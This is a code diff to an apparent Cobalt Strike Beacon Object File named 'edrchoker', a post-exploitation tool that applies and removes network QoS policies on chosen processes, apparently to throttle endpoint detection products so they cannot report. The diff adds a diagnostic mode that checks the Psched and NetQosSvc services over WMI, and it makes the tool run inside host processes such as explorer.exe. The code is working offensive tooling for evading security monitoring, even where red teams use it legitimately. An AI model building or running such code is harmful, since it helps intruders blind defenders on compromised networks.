@@ -274,6 +274,51 @@ static IWbemServices* WmiConnect(IWbemLocator* loc, const wchar_t* ns) {
     return svc;
 }
 
+/* ─── Diagnostic helper ──────────────────────────────────────────────────── */
+
+/*
+ * Query Win32_Service State for a single service name via ROOT\CIMV2.
+ * Prints one line: "  [svc] <name>  <State>"
+ */
+static void CheckServiceState(IWbemLocator* loc, const wchar_t* svcName) {
+    IWbemServices* pSvc = WmiConnect(loc, L"ROOT\\CIMV2");
+    if (!pSvc) return;
+
+    wchar_t wql[256];
+    int p = 0;
+    p = WAppend(wql, p, 256, L"SELECT State FROM Win32_Service WHERE Name = '");
+    p = WAppend(wql, p, 256, svcName);
+    if (p < 255) { wql[p] = L'\''; p++; }
+    wql[p] = L'\0';
+
+    BSTR lang  = OLEAUT32$SysAllocString(L"WQL");
+    BSTR query = OLEAUT32$SysAllocString(wql);
+    IEnumWbemClassObject* en = NULL;
+    pSvc->lpVtbl->ExecQuery(pSvc, lang, query,
+        WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &en);
+    OLEAUT32$SysFreeString(lang);
+    OLEAUT32$SysFreeString(query);
+
+    if (en) {
+        IWbemClassObject* obj = NULL; ULONG got = 0;
+        if (en->lpVtbl->Next(en, WBEM_INFINITE, 1, &obj, &got) == S_OK) {
+            VARIANT v; OLEAUT32$VariantInit(&v);
+            obj->lpVtbl->Get(obj, L"State", 0, &v, NULL, NULL);
+            const wchar_t* sState;
+            if (v.vt == VT_BSTR && v.bstrVal) { sState = v.bstrVal; } else { sState = L"?"; }
+            BeaconPrintf(CALLBACK_OUTPUT, "  [svc] %-14S  %S\n", svcName, sState);
+            OLEAUT32$VariantClear(&v);
+            obj->lpVtbl->Release(obj);
+        } else {
+            BeaconPrintf(CALLBACK_OUTPUT, "  [svc] %-14S  not found\n", svcName);
+        }
+        en->lpVtbl->Release(en);
+    } else {
+        BeaconPrintf(CALLBACK_OUTPUT, "  [svc] %-14S  query failed\n", svcName);
+    }
+    pSvc->lpVtbl->Release(pSvc);
+}
+
 /* ─── Entry point ────────────────────────────────────────────────────────── */
 /*
  * Args packed by CNA:  bof_pack($bid, "zz", cmd, process_list)
@@ -282,6 +327,7 @@ static IWbemServices* WmiConnect(IWbemLocator* loc, const wchar_t* ns) {
  * "remove"     → mode 1: restore specific process(es)
  * "remove_all" → mode 2: restore all QoS policies
  * "list"       → mode 3: show active policies
+ * "check"      → mode 4: diagnose — service states + list policies
  */
 void go(char* args, int len) {
     datap parser;
@@ -301,11 +347,12 @@ void go(char* args, int len) {
     cmd[ci] = L'\0';
 
     /* "add"        → 0  "remove" → 1
-     * "remove_all" → 2  "list"   → 3  */
+     * "remove_all" → 2  "list"   → 3  "check" → 4 */
     LONG mode = 0;
     if (cmd[0] == L'r' && cmd[6] == L'\0') mode = 1;
     if (cmd[0] == L'r' && cmd[6] == L'_')  mode = 2;
     if (cmd[0] == L'l')                     mode = 3;
+    if (cmd[0] == L'c')                     mode = 4;
 
     const int PLEN = 2048;
     wchar_t* buf = (wchar_t*)KERNEL32$VirtualAlloc(
@@ -323,13 +370,16 @@ void go(char* args, int len) {
     }
 
     HRESULT hr = OLE32$CoInitializeEx(NULL, COINIT_MULTITHREADED);
-    if (hr != S_OK && hr != S_FALSE) {
+    BOOL coOwned = (hr == S_OK);
+    /* RPC_E_CHANGED_MODE (0x80010106): process already has COM in STA apartment
+     * (explorer.exe, rundll32.exe, most GUI host processes). COM is available —
+     * do NOT abort. coOwned stays FALSE so we skip CoUninitialize. */
+    if (FAILED(hr) && hr != RPC_E_CHANGED_MODE) {
         BeaconPrintf(CALLBACK_ERROR,
             "[-] edrchoker: CoInitializeEx failed (0x%08X)\n", hr);
         KERNEL32$VirtualFree(buf, 0, MEM_RELEASE);
         return;
     }
-    BOOL coOwned = (hr == S_OK);
 
     IWbemLocator* pLoc = NULL;
     hr = OLE32$CoCreateInstance(&g_CLSID_WbemLocator, NULL,
@@ -404,7 +454,18 @@ void go(char* args, int len) {
         }
 
     /* ── MODE 3: list ────────────────────────────────────────────────────── */
+    } else if (mode == 3) {
+        IWbemServices* pSvc = WmiConnect(pLoc, L"ROOT\\StandardCimv2");
+        if (pSvc) {
+            ListPolicies(pSvc);
+            pSvc->lpVtbl->Release(pSvc);
+        }
+
+    /* ── MODE 4: check — diagnose services + list active policies ────────── */
     } else {
+        BeaconPrintf(CALLBACK_OUTPUT, "[edrchoker] diagnostics:\n");
+        CheckServiceState(pLoc, L"Psched");
+        CheckServiceState(pLoc, L"NetQosSvc");
         IWbemServices* pSvc = WmiConnect(pLoc, L"ROOT\\StandardCimv2");
         if (pSvc) {
             ListPolicies(pSvc);
